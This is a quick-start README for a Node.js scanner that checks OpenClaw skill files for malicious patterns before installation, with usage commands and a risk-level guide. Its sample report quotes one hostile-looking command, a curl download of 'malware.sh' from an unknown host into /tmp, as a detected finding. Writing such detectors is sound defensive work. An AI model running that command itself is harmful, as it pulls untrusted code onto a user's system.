# 🚀 QUICK START - Security Skill Scanner

## Installation (30 seconds)

```bash
cd security-skill-scanner
node test.js  # Verify it works
```

## Basic Usage

```bash
# Scan a single file
node scanner.js path/to/SKILL.md

# Scan a directory
node scanner.js ~/.openclaw/skills/

# Scan before installing
node scanner.js ~/Downloads/new-skill/
```

## What You Get

✅ Detects 40+ malicious patterns
✅ CRITICAL/HIGH/MEDIUM/LOW risk scoring
✅ Line-by-line analysis with examples
✅ Clear recommendations
✅ Works offline, no API keys needed

## Quick Decision Guide

| Risk Level | Action |
|------------|--------|
| 🔴 CRITICAL | ❌ DO NOT INSTALL |
| 🟠 HIGH | ⚠️ Review carefully, likely unsafe |
| 🟡 MEDIUM | ⚠️ Check findings, use caution |
| 🟢 LOW | ✅ Likely safe, minor issues |
| ℹ️ INFO | ✅ Safe to install |

## Example Output

```
═══════════════════════════════════════════════════
           SECURITY SCAN REPORT
═══════════════════════════════════════════════════

Overall Risk: 🔴 CRITICAL
Risk Score: 100/100

FINDINGS:
[🔴 CRITICAL] External binary download detected
  Line: 45
  Example: curl https://unknown.xyz/malware.sh -o /tmp/m.sh
  ⚠️  DO NOT INSTALL - Extremely dangerous

RECOMMENDATION: ❌ DO NOT INSTALL
```

## Files Included

- **SKILL.md** - Main skill definition (for ClawHub)
- **scanner.js** - Core scanner code
- **README.md** - Full documentation
- **GETTING_STARTED.md** - Detailed guide
- **CONTRIBUTING.md** - Contribution guide
- **UPLOAD_CHECKLIST.md** - Pre-upload checklist
- **test.js** - Test suite
- **examples/** - Test cases

## Next Steps for New Users

1. ✅ Clone or download from GitHub
2. ✅ Test the scanner locally with `node test.js`
3. ✅ Start scanning skills before installation
4. 📣 Star the repo if you find it useful
5. 🛡️ Help make OpenClaw safer!

## For Developers

Want to contribute? Check out **CONTRIBUTING.md** for:
- How to add new malware detection patterns
- Submitting bug reports
- Improving documentation
- Building new features

---

**Questions?** Read the full README.md or open a GitHub issue at:
https://github.com/anikrahman0/security-skill-scanner/issues

**Found a malicious skill?** Report it and we'll add detection patterns!

🛡️ **Mission**: Protect users from the 341+ malicious skills discovered on ClawHub!
